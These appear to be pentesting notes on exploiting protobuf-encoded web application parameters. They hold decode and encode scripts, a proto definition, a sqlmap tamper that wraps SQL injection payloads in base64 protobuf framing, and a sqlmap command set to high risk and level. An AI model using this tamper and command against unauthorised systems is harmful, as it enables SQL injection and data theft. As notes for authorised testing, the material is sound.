1. Base64 like encoding. Protobuf. Deserialize. https://aptw.tf/2021/10/27/exploiting-protobuf-webapps.html
	### 1. Script to de-protobuf:
	```python
	#!/usr/bin/python3
	
	import base64
	from subprocess import run, PIPE
	
	while 1:
	    try:
	        decoded_bytes = base64.b64decode(input("Insert string: "))[5:]
	        process = run(['protoc', '--decode_raw'], stdout=PIPE, input=decoded_bytes)
	
	        print("\n\033[94mResult:\033[0m")
	        print (str(process.stdout.decode("utf-8").strip()))
	    except KeyboardInterrupt:
	        break
	```
	### 2. Script to protobuf:
		a message definition similar to those that our target application should use.
	
	```python
	syntax = "proto2";
	package searchAPI;
	
	message Product {
	
	        message Prod {
	                required string name = 1;
	                optional int32 quantity = 2;
	        }
	
	        repeated Prod product = 1;
	}
	```
	
	the .proto file can be compiled with the following command:
	
	```
	protoc -I=. --python_out=. ./search.proto
	```
	
	As a result we got a library to be imported in our code to serialize/deserialize our messages which we can see in the import of the script (import search pb2).
	
	```python
	#!/usr/bin/python3
	
	import struct
	from base64 import b64encode, b64decode
	import search_pb2
	from subprocess import run, PIPE
	
	def encode(array):
	    """
	    Function to serialize an array of tuples
	    """
	    products = search_pb2.Product()
	    for tup in array:
	        p = products.product.add()
	        p.name = str(tup[0])
	        p.quantity = int(tup[1])
	
	    serializedString = products.SerializeToString()
	    serializedString = b64encode(b'\x00' + struct.pack(">I", len(serializedString)) + serializedString).decode("utf-8")
	
	    return serializedString
	
	test = encode([('tortellini', 0)]) # Text to encode in protobuf
	print (test)
	```
	
	### Step 3 - Coding the tamper
	
	Right after we understood the behaviour of Protobuf encoding process, coding a sqlmap tamper was a piece of cake.
	
	```python
	#!/usr/bin/env python
	
	from lib.core.data import kb
	from lib.core.enums import PRIORITY
	
	import base64
	import struct
	import search_pb2
	
	__priority__ = PRIORITY.HIGHEST
	
	def dependencies():
	    pass
	
	def tamper(payload, **kwargs):
	    retVal = payload
	
	    if payload:
	        # Instantiating objects
	        products = search_pb2.Product()
	        
	        p = products.product.add()
	        p.name = payload
	        p.quantity = 1
	
	        # Serializing the string
	        serializedString = products.SerializeToString()
	        serializedString = b'\x00' + struct.pack(">I",len(serializedString)) + serializedString
	
	        # Encoding the serialized string in base64
	        b64serialized = base64.b64encode(serializedString).decode("utf-8")
	        retVal = b64serialized
	
	    return retVal
	```
	
	To make it work we moved the tamper in the sqlmap tamper directory `/usr/share/sqlmap/tamper/` along with the Protobuf compiled library.
```
sqlmap -r test.txt --tamper brodobug --technique=BT --level=5 --risk=3
```